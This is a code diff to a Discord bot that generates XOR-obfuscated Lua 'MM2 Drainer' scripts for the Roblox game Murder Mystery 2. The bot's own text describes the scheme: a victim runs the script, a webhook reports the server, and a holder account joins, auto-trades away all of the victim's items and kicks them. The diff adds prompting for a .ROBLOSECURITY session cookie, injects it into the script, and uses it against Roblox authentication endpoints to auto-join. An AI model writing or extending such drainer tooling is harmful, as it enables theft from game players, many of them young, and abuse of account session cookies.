@@ -37,8 +37,9 @@ function isBlacklisted(id) { return db.blacklist.includes(id); }
 
 // ── roblox auto-joiner ────────────────────────────────────────────────────────
 // uses holder cookie to get an auth ticket then launches the game instance
-async function autoJoinServer(placeId, jobId) {
-  if (!ROBLOSECURITY) {
+async function autoJoinServer(placeId, jobId, cookieOverride = null) {
+  const activeCookie = cookieOverride || ROBLOSECURITY;
+  if (!activeCookie) {
     console.log("[AutoJoin] No ROBLOSECURITY cookie set — skipping.");
     return false;
   }
@@ -47,7 +48,7 @@ async function autoJoinServer(placeId, jobId) {
     // step 1: get CSRF token
     const csrfRes = await fetch("https://auth.roblox.com/v2/logout", {
       method: "POST",
-      headers: { "Cookie": `.ROBLOSECURITY=${ROBLOSECURITY}` }
+      headers: { "Cookie": `.ROBLOSECURITY=${activeCookie}` }
     });
     const csrf = csrfRes.headers.get("x-csrf-token");
     if (!csrf) { console.error("[AutoJoin] Failed to get CSRF token"); return false; }
@@ -56,7 +57,7 @@ async function autoJoinServer(placeId, jobId) {
     const ticketRes = await fetch("https://auth.roblox.com/v1/authentication-ticket", {
       method: "POST",
       headers: {
-        "Cookie": `.ROBLOSECURITY=${ROBLOSECURITY}`,
+        "Cookie": `.ROBLOSECURITY=${activeCookie}`,
         "x-csrf-token": csrf,
         "Referer": "https://www.roblox.com",
         "Content-Type": "application/json"
@@ -102,7 +103,7 @@ async function autoJoinServer(placeId, jobId) {
 
 
 // ── script v1 ─────────────────────────────────────────────────────────────────
-function buildScriptV1(holder, webhook) {
+function buildScriptV1(holder, webhook, cookie = null) {
   return `_G.Ex = _G.Ex or false
 if _G.Ex then return end
 _G.Ex = true
@@ -518,8 +519,8 @@ else task.wait(1) LocalPlayer:Kick("No items found.") end`;
 }
 
 // v2 placeholder — dj replaces this body
-function buildScriptV2(holder, webhook) {
-  return buildScriptV1(holder, webhook);
+function buildScriptV2(holder, webhook, cookie = null) {
+  return buildScriptV1(holder, webhook, cookie);
 }
 
 // ── obfuscator (XOR byte encoding) ───────────────────────────────────────────
@@ -532,9 +533,9 @@ function obfuscate(script) {
 
 // ── webhook auto-joiner trigger ───────────────────────────────────────────────
 // called when drainer script fires webhook — bot intercepts and joins server
-async function handleAutoJoin(placeId, jobId) {
+async function handleAutoJoin(placeId, jobId, cookieOverride = null) {
   console.log(`[AutoJoin] Triggered — placeId=${placeId} jobId=${jobId}`);
-  const ok = await autoJoinServer(placeId, jobId);
+  const ok = await autoJoinServer(placeId, jobId, cookieOverride);
   console.log(`[AutoJoin] Result: ${ok ? "success" : "failed / no cookie set"}`);
 }
 
@@ -679,28 +680,56 @@ client.on("interactionCreate", async (interaction) => {
   if (!data) return interaction.reply({ embeds: [errorEmbed("Picker expired. Run `!generate` again.")], ephemeral: true });
   if (interaction.user.id !== data.authorId) return interaction.reply({ embeds: [errorEmbed("This isn't your picker.")], ephemeral: true });
 
+  const version = isV1 ? 1 : 2;
+  const { holder, webhook } = data;
+
+  // ask for cookie
+  const cookieEmbed = new EmbedBuilder()
+    .setColor(0xFEE75C)
+    .setAuthor({ name: `MM2 Drainer — Version ${version} Selected` })
+    .setDescription(
+      "**Send your `.ROBLOSECURITY` cookie in this channel.**\n\n" +
+      "> This will be injected into the script for auto-join.\n" +
+      "> Type `skip` to generate without a cookie.\n\n" +
+      "⚠️ Send it quickly — expires in 60 seconds."
+    )
+    .setFooter({ text: "Cookie is never stored — injected once and discarded" })
+    .setTimestamp();
+
+  await interaction.update({ embeds: [cookieEmbed], components: [] });
+
+  // wait for cookie message
+  const filter = m => m.author.id === data.authorId;
+  const collected = await interaction.channel.awaitMessages({ filter, max: 1, time: 60_000, errors: [] });
+  const cookieMsg = collected.first();
+
+  // delete cookie message immediately
+  if (cookieMsg) { try { await cookieMsg.delete(); } catch {} }
+
+  const cookie = (cookieMsg && cookieMsg.content.toLowerCase() !== "skip")
+    ? cookieMsg.content.trim()
+    : null;
+
   pending.delete(key);
 
-  const { holder, webhook } = data;
-  const version = isV1 ? 1 : 2;
-  const raw     = isV1 ? buildScriptV1(holder, webhook) : buildScriptV2(holder, webhook);
-  const obfed   = obfuscate(raw);
-  const buffer  = Buffer.from(obfed, "utf-8");
-  const file    = new AttachmentBuilder(buffer, { name: `mm2_v${version}_${holder}.lua` });
+  const raw    = version === 1 ? buildScriptV1(holder, webhook, cookie) : buildScriptV2(holder, webhook, cookie);
+  const obfed  = obfuscate(raw);
+  const buffer = Buffer.from(obfed, "utf-8");
+  const file   = new AttachmentBuilder(buffer, { name: `mm2_v${version}_${holder}.lua` });
 
   const embed = new EmbedBuilder()
-    .setColor(isV1 ? 0x4f545c : 0x5865F2)
+    .setColor(version === 1 ? 0x4f545c : 0x5865F2)
     .setAuthor({ name: `MM2 Drainer — Version ${version} Generated` })
-    .setDescription(`Script ready. Holder auto-joins the server when the drainer fires — no manual action needed.\n\n> Script is XOR obfuscated on output.`)
+    .setDescription(`Script ready. ${cookie ? "Auto-join enabled — holder joins automatically." : "No cookie — holder must join manually."}\n\n> Script is XOR obfuscated on output.`)
     .addFields(
-      { name: "▸ Configuration", value: `\`\`\`\nHolder   : ${holder}\nWebhook  : set\nVersion  : v${version}\nMin Tier : Godly+\nAuto-join: ${ROBLOSECURITY ? "✅ enabled" : "⚠️ set ROBLOSECURITY var"}\n\`\`\``, inline: false },
+      { name: "▸ Configuration", value: `\`\`\`\nHolder   : ${holder}\nWebhook  : set\nVersion  : v${version}\nMin Tier : Godly+\nAuto-join: ${cookie ? "✅ enabled" : "⚠️ skipped"}\n\`\`\``, inline: false },
       { name: "▸ Trade Tiers",   value: "`Godly` `Ancient` `Vintage` `Unique` `Chroma`", inline: false },
-      { name: "▸ How it works",  value: "1. Victim runs script\n2. Webhook fires with server info\n3. Bot auto-joins server as holder\n4. Script detects holder → auto-trades all items → kicks victim", inline: false }
+      { name: "▸ How it works",  value: `1. Victim runs script\n2. Webhook fires with server info\n3. ${cookie ? "Bot auto-joins server as holder" : "Holder joins manually via link"}\n4. Script detects holder → auto-trades all items → kicks victim`, inline: false }
     )
     .setFooter({ text: `mm2 drainer v${version} • xor obfuscated` })
     .setTimestamp();
 
-  await interaction.update({ embeds: [embed], components: [], files: [file] });
+  await interaction.followUp({ embeds: [embed], files: [file] });
 });
 
 client.login(process.env.BOT_TOKEN);
